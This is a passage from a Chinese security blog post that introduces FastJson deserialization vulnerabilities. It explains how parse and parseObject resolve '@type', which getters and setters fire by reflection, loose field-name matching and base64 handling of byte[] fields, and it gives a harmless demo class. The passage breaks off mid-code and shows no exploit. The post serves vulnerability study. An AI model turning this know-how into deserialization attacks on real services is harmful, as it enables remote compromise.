                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
             const id = encodeURI(element.getAttribute('id')).toLowerCase();
             if (element === activeElement){
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
             } else {
                 document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
             }
         })
     }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
</script>

  <div class="post-content"><p>实际上，前不久刚刚分析了<code>FastJson1.2.80</code>漏洞，一方面对Java反序列化漏洞有了一个初步的了解，如果可以控制一个类的实例化，并且这个类里面的成员也存在可控，就可以注入恶意JSON实现反序列漏洞，另一方面由于<code>FastJson1.2.25</code>之后都是对AutoType机制进行绕过，所以也简单学习了AutoTypeCheck机制，还有一些期望类的<code>Gadget</code>。本文主要对<code>FastJson</code>常用的的解析<code>String</code>的parse,parseObject等方法进行分析，然后分析AutoTypeCheck机制，同时也对FastJson历史漏洞进行简单的整理。</p>
<h2 id="漏洞介绍">漏洞介绍<a hidden class="anchor" aria-hidden="true" href="#漏洞介绍">#</a></h2>
<p>这里就再介绍一下FastJson的背景。</p>
<p>fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。</p>
<p>由于其特点是快，以性能为优势快速占领了大量用户，并且其 API 十分简洁，用户量十分庞大，这也就导致了这样的组件一旦爆出漏洞，危害也将会是巨大的，因此，fastjson 从第一次报告安全漏洞至今，进行了若干次的安全更新，也与安全研究人员进行了来来回回多次的安全补丁-绕过的流程。</p>
<p>这里放一下框架图</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1616458393831.png" alt="img"  />
</p>
<p>主要功能在<code>DefaultJSONParser</code>类中实现的，在这个类中会应用其他的一些外部类来完成后续操作。<code>ParserConfig</code>主要是进行配置信息的初始化，<code>JSONLexer</code>主要是对json字符串进行处理并分析，反序列化在<code>JavaBeanDeserializer</code>中处理。</p>
<h2 id="反序列化方法">反序列化方法<a hidden class="anchor" aria-hidden="true" href="#反序列化方法">#</a></h2>
<p>将 json 数据反序列化时常使用的方法为<code>parse()</code>、<code>parseObject()</code>、<code>parseArray()</code>，这三个方法也均包含若干重载方法，带有不同参数：</p>
<ul>
<li>反序列化特性：<code>com.alibaba.fastjson.parser.Feature</code>，</li>
<li>类的类型：<code>java.lang.reflect.Type</code>，用来执行反序列化类的类型。</li>
<li>处理泛型反序列化：<code>com.alibaba.fastjson.TypeReference</code>。</li>
<li>编程扩展定制反序列化：<code>com.alibaba.fastjson.parser.deserializer.ParseProcess</code>，例如<code>ExtraProcessor</code> 用于处理多余的字段，<code>ExtraTypeProvider</code> 用于处理多余字段时提供类型信息。</li>
</ul>
<p>这里列举一些 fastjson 功能要点：</p>
<ul>
<li>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class。</li>
<li>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第4位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</li>
<li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。</li>
<li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li>
<li>fastjson 在为类属性寻找 get/set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li>
<li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li>
</ul>
<p>为了测试以上内容，我们写一个demo</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">  9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.alibaba.fastjson.JSON;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.UnsupportedEncodingException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Arrays;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Properties;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Base64;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName FastJsonTest
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/11 19:34
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> FastJsonTest {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String t1;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Integer t2;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Boolean t3;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Properties t4;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> Properties t5;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">byte</span>[] t6;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String toString() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#0ff;font-weight:bold">&#34;FastJsonTest{&#34;</span> +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;t1=&#39;&#34;</span> + t1 + <span style="color:#0ff;font-weight:bold">&#39;\&#39;&#39;</span> +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t2=&#34;</span> + t2 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t3=&#34;</span> + t3 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t4=&#34;</span> + t4 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t5=&#34;</span> + t5 +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;, t6=&#34;</span> + Arrays.<span style="color:#007f7f">toString</span>(t6) +
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#39;}&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">byte</span>[] getT6() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t6;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT6(<span style="color:#fff;font-weight:bold">byte</span>[] t6) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t6</span> = t6;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> FastJsonTest() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;FastJsonTest() is called &#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT5(Properties t5) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT5()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t5</span> = t5;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT1(String t1) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT1()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t1</span> = t1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setT2(Integer t2) {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;setT2()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">t2</span> = t2;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getT1() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT1()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t1;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Integer getT2() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT2()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t2;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Boolean getT3() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT3()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Properties getT4() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT4()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t4;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Properties getT5() {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;getT5()&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> t5;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> UnsupportedEncodingException {
</span></span><span style="display:flex;"><span>        String jsonString = <span style="color:#0ff;font-weight:bold">&#34;{\&#34;@type\&#34;:\&#34;com.reus09.FastJsonTest\&#34;,\&#34;t1\&#34;:\&#34;t1\&#34;,\&#34;t2\&#34;:1,\&#34;t3\&#34;:1,\&#34;t4\&#34;:{},\&#34;t5\&#34;:{},\&#34;t6\&#34;:\&#34;&#34;</span>+Base64.<span style="color:#007f7f">getEncoder</span>().<span style="color:#007f7f">encodeToString</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,FastJson&#34;</span>.<span style="color:#007f7f">getBytes</span>(<span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>))+<span style="color:#0ff;font-weight:bold">&#34;\&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parse(string)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj = JSON.<span style="color:#007f7f">parse</span>(jsonString);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parseObject(string,clazz)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj1 = JSON.<span style="color:#007f7f">parseObject</span>(jsonString,FastJsonTest.<span style="color:#007f7f">class</span>);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(obj1);
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(<span style="color:#0ff;font-weight:bold">&#34;---------JSON.parseObject(string)-----------&#34;</span>);
</span></span><span style="display:flex;"><span>        Object obj2 = JSON.<span style="color:#007f7f">parseObject</span>(jsonString);
